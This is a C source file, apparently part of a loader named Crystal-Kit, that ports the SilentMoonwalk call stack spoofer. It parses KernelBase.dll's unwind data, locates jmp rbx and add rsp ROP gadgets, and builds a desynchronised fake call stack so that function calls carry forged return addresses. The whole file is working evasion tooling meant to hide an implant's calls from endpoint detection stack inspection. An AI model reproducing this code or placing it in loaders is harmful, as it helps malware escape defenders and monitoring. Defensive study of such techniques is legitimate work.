/*
 * SilentMoonwalk call stack spoofer (desync mode).
 *
 * C port of SilentMoonwalk/SilentMoonwalk/SilentMoonwalk.cpp and
 * SilentMoonwalk/SilentMoonwalk/include/Functions.h. The C++ entry point,
 * debug printf's and the synthetic-frame setup were removed because the
 * Crystal-Kit loader is CRT-free and only uses the desync stack.
 */

// clang-format off
#include "Common.h"
#include "Functions.h"
#include "Spoof.h"
#include <windows.h>

// clang-format on
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);

extern PVOID silentmoonwalk_spoof_call(PSPOOFER config);

static int rand_value(unsigned long int *next) {
  *next = *next * 1103515245 + 12345;
  return ((unsigned int)(*next / 65536) % 0x7f) + 0x20;
}

void *custom_memset(void *dest, int val, size_t len) {
  for (char *dst = (char *)dest; len != 0; len--) {
    *dst++ = (char)val;
  }
  return dest;
}

PVOID GetExceptionDirectoryAddress(HMODULE hModule, DWORD *size) {
  IMAGE_DOS_HEADER *dos;
  IMAGE_NT_HEADERS *nt;
  IMAGE_DATA_DIRECTORY *dir;

  if (!hModule || !size) {
    return NULL;
  }

  dos = (IMAGE_DOS_HEADER *)hModule;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
    return NULL;
  }

  nt = (IMAGE_NT_HEADERS *)((UINT_PTR)hModule + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
    return NULL;
  }

  dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
  if (dir->VirtualAddress == 0 || dir->Size == 0) {
    return NULL;
  }

  *size = dir->Size;
  return (PVOID)((UINT_PTR)hModule + dir->VirtualAddress);
}

DWORD GetStackFrameSize(HMODULE hModule, PVOID unwindInfoAddress,
                        DWORD *targetStackOffset) {
  DWORD frameSize = 0;
  DWORD nodeIndex = 0;
  BOOL fpregHit = FALSE;
  PUNWIND_INFO unwindInfo = (PUNWIND_INFO)unwindInfoAddress;
  PUNWIND_CODE unwindCode = (PUNWIND_CODE)unwindInfo->UnwindCode;

  *targetStackOffset = 0;

  while (nodeIndex < unwindInfo->CountOfCodes) {
    frameSize = 0;

    switch (unwindCode->UnwindOp) {
    case UWOP_PUSH_NONVOL:
      if (unwindCode->OpInfo == RSP && !fpregHit) {
        return 0;
      }
      *targetStackOffset += 8;
      break;

    case UWOP_ALLOC_LARGE:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      frameSize = unwindCode->FrameOffset;

      if (unwindCode->OpInfo == 0) {
        frameSize *= 8;
      } else {
        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
        frameSize += unwindCode->FrameOffset << 16;
      }
      *targetStackOffset += frameSize;
      break;

    case UWOP_ALLOC_SMALL:
      *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
      break;

    case UWOP_SET_FPREG:
      if ((unwindInfo->Flags & 0x01) && (unwindInfo->Flags & 0x04)) {
        return 0;
      }
      fpregHit = TRUE;
      frameSize = (DWORD)(-16 * (int)unwindInfo->FrameOffset);
      *targetStackOffset += frameSize;
      break;

    case UWOP_SAVE_NONVOL:
      if (unwindCode->OpInfo == RBP || unwindCode->OpInfo == RSP) {
        return 0;
      }
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      break;

    case UWOP_SAVE_NONVOL_BIG:
      if (unwindCode->OpInfo == RBP || unwindCode->OpInfo == RSP) {
        return 0;
      }
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
      nodeIndex += 2;
      break;

    case UWOP_EPILOG:
    case UWOP_SAVE_XMM128:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      break;

    case UWOP_SPARE_CODE:
    case UWOP_SAVE_XMM128BIG:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
      nodeIndex += 2;
      break;

    case UWOP_PUSH_MACHFRAME:
      *targetStackOffset += (unwindCode->OpInfo == 0) ? 0x40 : 0x48;
      break;
    }

    unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
    nodeIndex++;
  }

  if (unwindInfo->Flags & 0x04) {
    PRUNTIME_FUNCTION chained;

    nodeIndex = unwindInfo->CountOfCodes;
    if (nodeIndex & 1) {
      nodeIndex++;
    }
    chained = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
    return GetStackFrameSize(
        hModule, (PVOID)((UINT_PTR)hModule + (DWORD)chained->UnwindData),
        targetStackOffset);
  }

  return fpregHit ? 1 : 0;
}

DWORD GetStackFrameSizeIgnoringUwopSetFpreg(HMODULE moduleBase,
                                            PVOID unwindInfoAddress,
                                            DWORD *targetStackOffset) {
  DWORD frameSize = 0;
  DWORD nodeIndex = 0;
  PUNWIND_INFO unwindInfo = (PUNWIND_INFO)unwindInfoAddress;
  PUNWIND_CODE unwindCode = (PUNWIND_CODE)unwindInfo->UnwindCode;

  *targetStackOffset = 0;

  while (nodeIndex < unwindInfo->CountOfCodes) {
    frameSize = 0;

    switch (unwindCode->UnwindOp) {
    case UWOP_PUSH_NONVOL:
      if (unwindCode->OpInfo == RSP) {
        return 0;
      }
      *targetStackOffset += 8;
      break;

    case UWOP_ALLOC_LARGE:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      frameSize = unwindCode->FrameOffset;

      if (unwindCode->OpInfo == 0) {
        frameSize *= 8;
      } else {
        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
        frameSize += unwindCode->FrameOffset << 16;
      }
      *targetStackOffset += frameSize;
      break;

    case UWOP_ALLOC_SMALL:
      *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
      break;

    case UWOP_SET_FPREG:
      /* ignored */
      break;

    case UWOP_SAVE_NONVOL:
      if (unwindCode->OpInfo == RSP) {
        return 0;
      }
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      break;

    case UWOP_SAVE_NONVOL_BIG:
      if (unwindCode->OpInfo == RSP) {
        return 0;
      }
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
      nodeIndex += 2;
      break;

    case UWOP_EPILOG:
    case UWOP_SAVE_XMM128:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      break;

    case UWOP_SPARE_CODE:
    case UWOP_SAVE_XMM128BIG:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
      nodeIndex += 2;
      break;

    case UWOP_PUSH_MACHFRAME:
      *targetStackOffset += (unwindCode->OpInfo == 0) ? 0x40 : 0x48;
      break;
    }

    unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
    nodeIndex++;
  }

  if (unwindInfo->Flags & 0x04) {
    PRUNTIME_FUNCTION chained;

    nodeIndex = unwindInfo->CountOfCodes;
    if (nodeIndex & 1) {
      nodeIndex++;
    }
    chained = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
    return GetStackFrameSizeIgnoringUwopSetFpreg(
        moduleBase, (PVOID)((UINT_PTR)moduleBase + (DWORD)chained->UnwindData),
        targetStackOffset);
  }

  return *targetStackOffset;
}

DWORD GetStackFrameSizeWhereRbpIsPushedOnStack(HMODULE moduleBase,
                                               PVOID unwindInfoAddress,
                                               DWORD *targetStackOffset) {
  DWORD saveStackOffset = 0;
  DWORD backupStackOffset = 0;
  DWORD savedRegs[16];
  BOOL rbpPushed = FALSE;
  DWORD frameSize = 0;
  DWORD nodeIndex = 0;
  PUNWIND_INFO unwindInfo = (PUNWIND_INFO)unwindInfoAddress;
  PUNWIND_CODE unwindCode = (PUNWIND_CODE)unwindInfo->UnwindCode;
  DWORD countOfCodes = unwindInfo->CountOfCodes;

  *targetStackOffset = 0;
  backupStackOffset = 0;
  custom_memset(savedRegs, 0, sizeof(savedRegs));

  while (nodeIndex < countOfCodes) {
    frameSize = 0;

    switch (unwindCode->UnwindOp) {
    case UWOP_PUSH_NONVOL:
      if (unwindCode->OpInfo == RSP) {
        return 0;
      }
      if (unwindCode->OpInfo == RBP && rbpPushed) {
        return 0;
      } else if (unwindCode->OpInfo == RBP) {
        saveStackOffset = *targetStackOffset;
        rbpPushed = TRUE;
      }
      *targetStackOffset += 8;
      break;

    case UWOP_ALLOC_LARGE:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      frameSize = unwindCode->FrameOffset;

      if (unwindCode->OpInfo == 0) {
        frameSize *= 8;
      } else {
        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
        frameSize += unwindCode->FrameOffset << 16;
      }
      *targetStackOffset += frameSize;
      break;

    case UWOP_ALLOC_SMALL:
      *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
      break;

    case UWOP_SET_FPREG:
      return 0;

    case UWOP_SAVE_NONVOL:
      if (unwindCode->OpInfo == RSP) {
        return 0;
      } else {
        savedRegs[unwindCode->OpInfo] =
            *targetStackOffset +
            (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;

        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;

        if (unwindCode->OpInfo != RBP) {
          *targetStackOffset = backupStackOffset;
          break;
        }
        if (rbpPushed) {
          return 0;
        }

        rbpPushed = TRUE;
        saveStackOffset = savedRegs[unwindCode->OpInfo];
        *targetStackOffset = backupStackOffset;
      }
      break;

    case UWOP_SAVE_NONVOL_BIG:
      if (unwindCode->OpInfo == RSP) {
        return 0;
      }

      savedRegs[unwindCode->OpInfo] =
          *targetStackOffset +
          (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
      savedRegs[unwindCode->OpInfo] +=
          (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;

      if (unwindCode->OpInfo != RBP) {
        *targetStackOffset = backupStackOffset;
        break;
      }
      if (rbpPushed) {
        return 0;
      }

      saveStackOffset = savedRegs[unwindCode->OpInfo];
      *targetStackOffset = backupStackOffset;

      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
      nodeIndex += 2;
      break;

    case UWOP_EPILOG:
    case UWOP_SAVE_XMM128:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
      nodeIndex++;
      break;

    case UWOP_SPARE_CODE:
    case UWOP_SAVE_XMM128BIG:
      unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
      nodeIndex += 2;
      break;

    case UWOP_PUSH_MACHFRAME:
      *targetStackOffset += (unwindCode->OpInfo == 0) ? 0x40 : 0x48;
      break;
    }

    unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
    nodeIndex++;
  }

  if (unwindInfo->Flags & 0x04) {
    PRUNTIME_FUNCTION chained;

    nodeIndex = unwindInfo->CountOfCodes;
    if (nodeIndex & 1) {
      nodeIndex++;
    }
    chained = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
    return GetStackFrameSize(
        moduleBase, (PVOID)((UINT_PTR)moduleBase + (DWORD)chained->UnwindData),
        targetStackOffset);
  }

  return saveStackOffset;
}

void FindProlog(HMODULE moduleBase, PRUNTIME_FUNCTION pRuntimeFunctionTable,
                DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex,
                PDWORD skip, PDWORD64 rtTargetOffset, PSPOOFER config) {
  DWORD suitableFrames = 0;
  DWORD i;

  *stackSize = 0;

  for (i = 0; i < rtLastIndex; i++) {
    PUNWIND_INFO unwindInfo =
        (PUNWIND_INFO)((UINT64)moduleBase +
                       (DWORD)pRuntimeFunctionTable[i].UnwindData);
    DWORD status = GetStackFrameSize(moduleBase, (PVOID)unwindInfo, stackSize);

    if (status != 0) {
      suitableFrames++;
      if (*skip >= suitableFrames) {
        continue;
      }
      *skip = suitableFrames;
      *prtSaveIndex = i;
      break;
    }
  }

  *rtTargetOffset =
      (DWORD64)((UINT64)moduleBase +
                (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);
  config->FirstFrameFunctionPointer = (PVOID)*rtTargetOffset;
  config->FirstFrameSize = *stackSize;
}

DWORD FindPushRbp(HMODULE moduleBase, PRUNTIME_FUNCTION pRuntimeFunctionTable,
                  DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex,
                  PDWORD skip, PDWORD64 rtTargetOffset, PSPOOFER config) {
  DWORD suitableFrames = 0;
  DWORD status = 0;
  DWORD i;

  *stackSize = 0;

  for (i = 0; i < rtLastIndex; i++) {
    PUNWIND_INFO unwindInfo =
        (PUNWIND_INFO)((UINT64)moduleBase +
                       (DWORD)pRuntimeFunctionTable[i].UnwindData);
    status = GetStackFrameSizeWhereRbpIsPushedOnStack(
        moduleBase, (PVOID)unwindInfo, stackSize);

    if (status != 0) {
      suitableFrames++;
      if (*skip >= suitableFrames) {
        continue;
      }
      *skip = suitableFrames;
      *prtSaveIndex = i;
      break;
    }
  }

  *rtTargetOffset =
      (DWORD64)((UINT64)moduleBase +
                (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);
  config->SecondFrameFunctionPointer = (PVOID)*rtTargetOffset;
  config->SecondFrameSize = *stackSize;
  config->StackOffsetWhereRbpIsPushed = status;

  return status;
}

void FindGadget(HMODULE moduleBase, PRUNTIME_FUNCTION pRuntimeFunctionTable,
                DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex,
                PDWORD skip, DWORD gadgetType, PSPOOFER config) {
  DWORD gadgets = 0;
  DWORD status = 0;
  DWORD i;
  DWORD imm = 0x38;
  DWORD addRspGadget = ADD_RSP_0x38;

  for (i = 0; i < rtLastIndex; i++) {
    BOOL gadgetFound = FALSE;
    UINT64 j;

    for (j = (UINT64)moduleBase + pRuntimeFunctionTable[i].BeginAddress;
         j < (UINT64)moduleBase + pRuntimeFunctionTable[i].EndAddress; j++) {
      BOOL hit = FALSE;

      if (gadgetType == 0) {
        if (*(WORD *)j == JMP_RBX) {
          hit = TRUE;
        }
      } else {
        if (*(DWORD *)j == addRspGadget && *(BYTE *)(j + 4) == RET) {
          hit = TRUE;
        }
      }

      if (!hit) {
        continue;
      }

      *stackSize = 0;
      {
        PUNWIND_INFO unwindInfo =
            (PUNWIND_INFO)((UINT64)moduleBase +
                           (DWORD)pRuntimeFunctionTable[i].UnwindData);
        status = GetStackFrameSizeIgnoringUwopSetFpreg(
            moduleBase, (PVOID)unwindInfo, stackSize);
      }

      if (status != 0) {
        if (gadgetType == 1 && *stackSize != imm) {
          continue;
        }

        gadgets++;
        if (*skip >= gadgets) {
          continue;
        }
        *skip = gadgets;

        if (gadgetType == 1) {
          config->AddRspXGadget = (PVOID)j;
          config->AddRspXGadgetFrameSize = *stackSize;
        } else {
          config->JmpRbxGadget = (PVOID)j;
          config->JmpRbxGadgetFrameSize = *stackSize;
        }

        gadgetFound = TRUE;
        *prtSaveIndex = i;
        break;
      }
    }

    if (gadgetFound) {
      break;
    }
  }
}

ULONG_PTR spoof_call(FUNCTION_CALL *call) {
  SPOOFER config;
  HMODULE kernelBase;
  DWORD rtSize = 0;
  PRUNTIME_FUNCTION rt;
  DWORD rtLastIndex;
  DWORD skipProlog = 0;
  DWORD skipPushRbp = 1;
  DWORD skipJmp = 0;
  DWORD skipAddRsp = 0;
  DWORD stackSize = 0;
  DWORD rtSaveIndex = 0;
  DWORD64 rtTargetOffset = 0;

  if (!call || !call->ptr || call->argc < 0 || call->argc > 8) {
    return 0;
  }

  custom_memset(&config, 0, sizeof(config));

  kernelBase = KERNEL32$GetModuleHandleA("KernelBase.dll");
  if (!kernelBase) {
    return 0;
  }
  config.KernelBaseAddress = (PVOID)kernelBase;

  rt = (PRUNTIME_FUNCTION)GetExceptionDirectoryAddress(kernelBase, &rtSize);
  if (!rt || rtSize < sizeof(RUNTIME_FUNCTION)) {
    return 0;
  }
  rtLastIndex = rtSize / sizeof(RUNTIME_FUNCTION);

  {
    unsigned long int randState = SEED;
    config.FirstFrameRandomOffset = (UINT64)rand_value(&randState);
    config.SecondFrameRandomOffset = (UINT64)rand_value(&randState);
  }

  config.SpoofFunctionPointer = call->ptr;
  config.Nargs = (UINT64)call->argc;

  FindProlog(kernelBase, rt, rtLastIndex, &stackSize, &rtSaveIndex, &skipProlog,
             &rtTargetOffset, &config);
  FindPushRbp(kernelBase, rt, rtLastIndex, &stackSize, &rtSaveIndex,
              &skipPushRbp, &rtTargetOffset, &config);
  FindGadget(kernelBase, rt, rtLastIndex, &stackSize, &rtSaveIndex, &skipJmp, 0,
             &config);
  FindGadget(kernelBase, rt, rtLastIndex, &stackSize, &rtSaveIndex, &skipAddRsp,
             1, &config);

  if (!config.FirstFrameFunctionPointer || !config.SecondFrameFunctionPointer ||
      !config.JmpRbxGadget || !config.AddRspXGadget || !config.FirstFrameSize ||
      !config.SecondFrameSize || !config.JmpRbxGadgetFrameSize ||
      !config.AddRspXGadgetFrameSize) {
    return 0;
  }

  config.Arg01 = (PVOID)call->args[0];
  config.Arg02 = (PVOID)call->args[1];
  config.Arg03 = (PVOID)call->args[2];
  config.Arg04 = (PVOID)call->args[3];
  config.Arg05 = (PVOID)call->args[4];
  config.Arg06 = (PVOID)call->args[5];
  config.Arg07 = (PVOID)call->args[6];
  config.Arg08 = (PVOID)call->args[7];

  config.ReturnAddress = (PVOID)((ULONG_PTR)__builtin_frame_address(0) + 8);

  return (ULONG_PTR)silentmoonwalk_spoof_call(&config);
}
